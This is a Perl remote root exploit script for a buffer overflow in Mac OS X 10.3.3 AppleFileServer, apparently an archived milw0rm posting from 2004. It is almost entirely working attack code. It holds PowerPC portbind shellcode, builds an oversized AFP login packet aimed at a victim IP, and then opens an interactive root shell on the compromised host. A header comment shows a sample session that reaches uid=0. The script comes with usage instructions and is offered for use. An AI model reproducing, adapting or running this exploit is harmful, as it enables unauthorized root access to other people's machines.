<html><head><title>Mac OS X <= 10.3.3 AppleFileServer Remote Root Overflow Exploit
</title></head><pre>#!/usr/bin/perl
# Priv8security com remote root exploit for AppleFileServer.
# PUBLIC VERSION!!!!
#
# Bug found by Dave G. and Dino Dai Zovi.
# URL: http://www.atstake.com/research/advisories/2004/a050304-1.txt
#
# [wsxz@localhost buffer]$ perl priv8afp.pl -h 10.4.12.199 -t 0
# -=[Priv8security.com Apple File Server remote root exploit!]=-
#
# [+] Using target: MacOSX 10.3.3
# [+] Using ret: 0xf0101cb0
# [+] Sending Request Opensession... DOne!
# [+] Got response packet:
# Flags: 1 Cmd: 4 ID: 31337
# [+] Sending FPloginEXT packet... DOne!
# [+] Waiting... We got in =)
#
# ****** Welcome to 'Adriano-Limas-Computer' ******
#
# Darwin Adriano-Limas-Computer.local 7.3.1 Darwin Kernel Version 7.3.1: Mon Mar
# 22 21:48:41 PST 2004; root:xnu/xnu-517.4.12.obj~2/RELEASE_PPC Power Macintosh powerpc
# uid=0(root) gid=0(wheel) groups=0(wheel), 1(daemon), 2(kmem), 3(sys), 4(tty),
# 5(operator), 20(staff), 31(guest), 80(admin)
#
####################################################################
use IO::Socket;

use Getopt::Std; getopts('h:t:p:o:', \%args);
if (defined($args{'h'})) { $host = $args{'h'}; }
if (defined($args{'t'})) { $target = $args{'t'}; }
if (defined($args{'p'})) { $port = $args{'p'};}else{$port = 548;}
if (defined($args{'o'})) { $offset = $args{'o'}; }else{$offset = 0;}


my @targets = (
# description, ret, Magic size.
[&quot;MacOSX 10.3.3&quot;, 0xf0101cb0, 4], #tested on my ibook g4
);

print STDERR &quot;-=[Priv8security.com Apple File Server remote root exploit!]=-\n\n&quot;;

if (!defined($host) || !defined($target)) {
Usage();
}

($desc,$ret,$msize) = @{$targets[$target]};

print STDERR &quot;[+] Using target: $desc\n&quot;;
print STDERR &quot;[+] Using ret: 0x&quot; . sprintf('%lx', $ret + $offset) . &quot;\n&quot;;

$shellcode = # portbind shellcode by br00t [at] blueyonder.co.uk
&quot;\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb\x01\x70&quot;.
&quot;\x39\x80\x01\x70\x3b\xdf\xff\x88\x7c\xbe\x29\xae\x3b\xdf\xff\x89&quot;.
&quot;\x7c\xbe\x29\xae\x3b\xdf\xff\x8a\x7c\xbe\x29\xae\x3b\xdf\xff\x8b&quot;.
&quot;\x7c\xbe\x29\xae\x38\x6c\xfe\x92\x38\x8c\xfe\x91\x38\xac\xfe\x96&quot;.
&quot;\x38\x0c\xfe\xf1\x44\xff\xff\x02\x60\x60\x60\x60\x7c\x67\x1b\x78&quot;.
&quot;\x38\x9f\xff\x84\x38\xac\xfe\xa0\x38\x0c\xfe\xf8\x44\xff\xff\x02&quot;.
&quot;\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x91\x38\x0c\xfe\xfa&quot;.
&quot;\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xe3\x3b\x78\x38\x8c\xfe\x90&quot;.
&quot;\x38\xac\xfe\x90\x38\x0c\xfe\xae\x44\xff\xff\x02\x60\x60\x60\x60&quot;.
&quot;\x38\x8c\xfe\x90\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60&quot;.
&quot;\x38\x8c\xfe\x91\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60&quot;.
&quot;\x38\x8c\xfe\x92\x38\x0c\xfe\xea\x44\xff\xff\x02\x60\x60\x60\x60&quot;.
&quot;\x38\x0c\xfe\x92\x44\xff\xff\x02\x60\x60\x60\x60\x39\x1f\xff\x83&quot;.
&quot;\x7c\xa8\x29\xae\x38\x7f\xff\x7c\x90\x61\xff\xf8\x90\xa1\xff\xfc&quot;.
&quot;\x38\x81\xff\xf8\x38\x0c\xfe\xcb\x44\xff\xff\x02\x41\x41\x41\x41&quot;.
&quot;\x41\x41\x41\x41\x2f\x62\x69\x6e\x2f\x73\x68\x58\xff\x02\x1b\x39&quot;.
&quot;\x41\x41\x41\x41&quot;;

$bin_ret = reverse(pack('l', ($ret + $offset)));

$buffer = &quot;\x60&quot; x 141;
$buffer .= $bin_ret;
$buffer .= &quot;\x60&quot; x (824 - length($shellcode));
$buffer .= $shellcode;
$buffer .= &quot;A&quot; x 100;

$req =
&quot;\x00\x04&quot;.# Request Opensession
&quot;\x7a\x69\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;

$packet = 
&quot;\x00&quot;. # Request
&quot;\x02&quot;. # Command
&quot;\x7a\x69&quot;.# leet ID
&quot;\x00\x00\x00\x00&quot;.# Data Offset
&quot;\x00\x00\x04\x00&quot;.# Length
&quot;\x00\x00\x00\x00&quot;.# Reserved
&quot;\x3f&quot;. # FPloginext
&quot;\x00&quot;. # Pad
&quot;\x00\x00&quot;. # Flags
&quot;\x0e\x41\x46\x50\x56\x65\x72\x73\x69\x6f\x6e\x20\x32\x2e\x31&quot;.# Version
&quot;\x10\x43\x6c\x65\x61\x72\x74\x78\x74\x20\x70\x61\x73\x73\x77\x72\x64&quot;. # UAM
&quot;\x03&quot;. # Type
&quot;\x00\x07&quot;. # User Len
&quot;\x41\x64\x72\x69\x61\x6e\x6f&quot; .# AFPNAME USER
&quot;\x03&quot;. # Pathtype
&quot;\x80\xff&quot;. # Path Len
$buffer. # Evil String
&quot;\x00&quot;; # Pad

$len = reverse(pack(&quot;S&quot;, $msize));

substr($packet, 63 , 2, $len);

$f = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerHost=&gt;$host,PeerPort=&gt;$port)
or die &quot;[-] Cant connect: $!\n\n&quot;;

print STDERR &quot;[+] Sending Request Opensession... &quot;;

$f-&gt;send($req);
print STDERR &quot;DOne!\n&quot;;

$f-&gt;recv($crap,128);
if($crap){
print STDERR &quot;[+] Got response packet:\n&quot;;
parse_packet($crap);
}

print STDERR &quot;[+] Sending FPloginEXT packet... &quot;;
$f-&gt;send($packet);
print STDERR &quot;DOne!\n&quot;;
print STDERR &quot;[+] Waiting... &quot;;

sleep(5);

$sc = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerHost=&gt;$host,PeerPort=&gt;6969,Type=&gt;SOCK_STREAM,Reuse=&gt;1)
or die &quot;No luck :( $!\n\n&quot;;

print &quot;We got in =)\n&quot;;

$sc-&gt;autoflush(1);

sleep(2);

print $sc &quot;echo;echo \&quot;****** Welcome to '`hostname -s`' ******\&quot;\n&quot;;
print $sc &quot;echo;uname -a;id;echo\n&quot;;

die &quot;cant fork: $!&quot; unless defined($pid = fork());

if ($pid) {
while(defined ($line = &lt;$sc&gt;)) {
print STDOUT $line;
}
kill(&quot;TERM&quot;, $pid);
}
else
{
while(defined ($line = &lt;STDIN&gt;)) {
print $sc $line;
}
}
close($sc);
print &quot;Good bye!!\n&quot;;

sub parse_packet
{
my ($buf) = shift @_;
my (@packet);
my ($i);

for ($i=0;$i&lt;length($buf);$i++)
{
push(@packet, substr($buf, $i, 1));
}

my ($flags) = unpack(&quot;C&quot;, @packet[0]);
my ($cmd) = unpack(&quot;C&quot;, @packet[1]);

my ($request_id) = unpack(&quot;n&quot;, @packet[2] . @packet[3]);
print &quot; Flags: $flags Cmd: $cmd ID: $request_id\n&quot;;

}


sub Usage {

print STDERR &quot;Options:
-h Victim ip.
-t Target number from list.
-p Port to attack.
-o Offset, try in steps of 500.\n\n&quot;;

print STDERR &quot;Targets:\n&quot;;
for($i=0; $i &lt; @targets; $i++){
($dd) = @{$targets[$i]};
print STDERR &quot; $i - $dd\n&quot;;
}
print STDERR &quot;\nUsage: perl $0 -h Victim -t target\n\n&quot;;
exit;
}

# milw0rm.com [2004-08-13]</pre></html>